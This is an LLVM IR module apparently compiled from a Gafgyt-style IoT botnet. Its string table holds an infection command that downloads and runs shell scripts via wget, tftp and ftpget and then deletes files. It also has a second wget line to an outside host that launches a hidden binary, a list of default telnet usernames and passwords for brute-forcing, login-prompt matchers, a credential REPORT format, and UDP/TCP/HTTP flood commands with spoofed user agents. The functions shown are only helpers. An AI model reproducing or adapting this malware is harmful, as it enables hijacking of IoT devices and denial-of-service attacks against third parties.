; ModuleID = 'host/ir_O0/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

